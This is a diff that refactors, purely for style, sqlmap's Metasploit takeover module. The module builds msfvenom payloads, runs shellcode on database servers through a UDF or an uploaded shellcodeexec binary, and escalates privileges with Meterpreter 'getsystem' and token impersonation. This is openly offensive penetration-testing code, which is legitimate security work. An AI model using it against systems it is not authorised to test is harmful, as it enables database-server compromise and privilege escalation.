@@ -132,11 +132,7 @@ class Metasploit(object):
         }
 
     def _skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
-        if Backend.isOs(OS.WINDOWS):
-            opSys = "windows"
-        else:
-            opSys = "linux"
-
+        opSys = "windows" if Backend.isOs(OS.WINDOWS) else "linux"
         message = "which %s do you want to use?" % msg
 
         if lst:
@@ -181,8 +177,11 @@ class Metasploit(object):
 
     def _selectPayload(self):
         if Backend.isOs(OS.WINDOWS) and conf.privEsc:
-            infoMsg = "forcing Metasploit payload to Meterpreter because "
-            infoMsg += "it is the only payload that can be used to "
+            infoMsg = (
+                "forcing Metasploit payload to Meterpreter because "
+                + "it is the only payload that can be used to "
+            )
+
             infoMsg += "escalate privileges via 'incognito' extension, "
             infoMsg += "'getsystem' command or post modules"
             logger.info(infoMsg)
@@ -195,31 +194,39 @@ class Metasploit(object):
             choose = False
 
             if Backend.isDbms(DBMS.MYSQL):
-                debugMsg = "by default MySQL on Windows runs as SYSTEM "
-                debugMsg += "user, it is likely that the the VNC "
+                debugMsg = (
+                    "by default MySQL on Windows runs as SYSTEM "
+                    + "user, it is likely that the the VNC "
+                )
+
                 debugMsg += "injection will be successful"
                 logger.debug(debugMsg)
 
             elif Backend.isDbms(DBMS.PGSQL):
                 choose = True
 
-                warnMsg = "by default PostgreSQL on Windows runs as "
-                warnMsg += "postgres user, it is unlikely that the VNC "
+                warnMsg = (
+                    "by default PostgreSQL on Windows runs as "
+                    + "postgres user, it is unlikely that the VNC "
+                )
+
                 warnMsg += "injection will be successful"
                 logger.warn(warnMsg)
 
             elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                 choose = True
 
-                warnMsg = "it is unlikely that the VNC injection will be "
-                warnMsg += "successful because usually Microsoft SQL Server "
+                warnMsg = (
+                    "it is unlikely that the VNC injection will be "
+                    + "successful because usually Microsoft SQL Server "
+                )
+
                 warnMsg += "%s runs as Network Service " % Backend.getVersion()
                 warnMsg += "or the Administrator is not logged in"
                 logger.warn(warnMsg)
 
             if choose:
-                message = "what do you want to do?\n"
-                message += "[1] Give it a try anyway\n"
+                message = "what do you want to do?\n" + "[1] Give it a try anyway\n"
                 message += "[2] Fall back to Meterpreter payload (default)\n"
                 message += "[3] Fall back to Shell payload"
 
@@ -376,11 +383,7 @@ class Metasploit(object):
             self._cliCmd += "; exploit'"
 
     def _forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
-        if kb.oldMsf:
-            self._payloadCmd = self._msfPayload
-        else:
-            self._payloadCmd = "%s -p" % self._msfVenom
-
+        self._payloadCmd = self._msfPayload if kb.oldMsf else "%s -p" % self._msfVenom
         self._payloadCmd += " %s" % self.payloadConnStr
         self._payloadCmd += " EXITFUNC=%s" % exitfunc
         self._payloadCmd += " LPORT=%s" % self.portStr
@@ -401,22 +404,24 @@ class Metasploit(object):
                     self._payloadCmd += " %s" % extra
             else:
                 self._payloadCmd += " X > \"%s\"" % outFile
+        elif extra == "BufferRegister=EAX":
+            self._payloadCmd += " -a x86 -e %s -f %s" % (self.encoderStr, format)
+
+            if extra is not None:
+                self._payloadCmd += " %s" % extra
+
+            self._payloadCmd += " > \"%s\"" % outFile
         else:
-            if extra == "BufferRegister=EAX":
-                self._payloadCmd += " -a x86 -e %s -f %s" % (self.encoderStr, format)
-
-                if extra is not None:
-                    self._payloadCmd += " %s" % extra
-
-                self._payloadCmd += " > \"%s\"" % outFile
-            else:
-                self._payloadCmd += " -f exe > \"%s\"" % outFile
+            self._payloadCmd += " -f exe > \"%s\"" % outFile
 
     def _runMsfCliSmbrelay(self):
         self._forgeMsfCliCmdForSmbrelay()
 
-        infoMsg = "running Metasploit Framework command line "
-        infoMsg += "interface locally, please wait.."
+        infoMsg = (
+            "running Metasploit Framework command line "
+            + "interface locally, please wait.."
+        )
+
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
@@ -425,23 +430,32 @@ class Metasploit(object):
     def _runMsfCli(self, exitfunc):
         self._forgeMsfCliCmd(exitfunc)
 
-        infoMsg = "running Metasploit Framework command line "
-        infoMsg += "interface locally, please wait.."
+        infoMsg = (
+            "running Metasploit Framework command line "
+            + "interface locally, please wait.."
+        )
+
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
         self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
 
     def _runMsfShellcodeRemote(self):
-        infoMsg = "running Metasploit Framework shellcode "
-        infoMsg += "remotely via UDF 'sys_bineval', please wait.."
+        infoMsg = (
+            "running Metasploit Framework shellcode "
+            + "remotely via UDF 'sys_bineval', please wait.."
+        )
+
         logger.info(infoMsg)
 
         self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
 
     def _runMsfShellcodeRemoteViaSexec(self):
-        infoMsg = "running Metasploit Framework shellcode remotely "
-        infoMsg += "via shellcodeexec, please wait.."
+        infoMsg = (
+            "running Metasploit Framework shellcode remotely "
+            + "via shellcodeexec, please wait.."
+        )
+
         logger.info(infoMsg)
 
         if not Backend.isOs(OS.WINDOWS):
@@ -471,15 +485,21 @@ class Metasploit(object):
         if conf.privEsc:
             print()
 
-            infoMsg = "trying to escalate privileges using Meterpreter "
-            infoMsg += "'getsystem' command which tries different "
+            infoMsg = (
+                "trying to escalate privileges using Meterpreter "
+                + "'getsystem' command which tries different "
+            )
+
             infoMsg += "techniques, including kitrap0d"
             logger.info(infoMsg)
 
             send_all(proc, "getsystem\n")
 
-            infoMsg = "displaying the list of available Access Tokens. "
-            infoMsg += "Choose which user you want to impersonate by "
+            infoMsg = (
+                "displaying the list of available Access Tokens. "
+                + "Choose which user you want to impersonate by "
+            )
+
             infoMsg += "using incognito's command 'impersonate_token' if "
             infoMsg += "'getsystem' does not success to elevate privileges"
             logger.info(infoMsg)
@@ -495,10 +515,7 @@ class Metasploit(object):
         while True:
             returncode = proc.poll()
 
-            if returncode is None:
-                # Child hasn't exited yet
-                pass
-            else:
+            if returncode is not None:
                 logger.debug("connection closed properly")
                 return returncode
 
@@ -553,9 +570,9 @@ class Metasploit(object):
                 timeout = time.time() - start_time > METASPLOIT_SESSION_TIMEOUT
 
                 if not initialized:
-                    match = re.search(b"Meterpreter session ([\\d]+) opened", out)
-
-                    if match:
+                    if match := re.search(
+                        b"Meterpreter session ([\\d]+) opened", out
+                    ):
                         self._loadMetExtensions(proc, match.group(1))
 
                         if "shell" in self.payloadStr:
@@ -565,8 +582,7 @@ class Metasploit(object):
                         initialized = True
                     elif timeout:
                         proc.kill()
-                        errMsg = "timeout occurred while attempting "
-                        errMsg += "to open a remote session"
+                        errMsg = "timeout occurred while attempting " + "to open a remote session"
                         raise SqlmapGenericException(errMsg)
 
             except select.error as ex:
@@ -598,13 +614,14 @@ class Metasploit(object):
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        match = re.search(b"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\\d]+)", payloadStderr)
-
-        if match:
+        if match := re.search(
+            b"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\\d]+)",
+            payloadStderr,
+        ):
             payloadSize = int(match.group(2))
 
             if extra == "BufferRegister=EAX":
-                payloadSize = payloadSize // 2
+                payloadSize //= 2
 
             debugMsg = "the shellcode size is %d bytes" % payloadSize
             logger.debug(debugMsg)
@@ -647,8 +664,11 @@ class Metasploit(object):
             written = self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", forceCheck=True)
 
         if written is not True:
-            errMsg = "there has been a problem uploading shellcodeexec. It "
-            errMsg += "looks like the binary file has not been written "
+            errMsg = (
+                "there has been a problem uploading shellcodeexec. It "
+                + "looks like the binary file has not been written "
+            )
+
             errMsg += "on the database underlying file system or an AV has "
             errMsg += "flagged it as malicious and removed it"
             logger.error(errMsg)
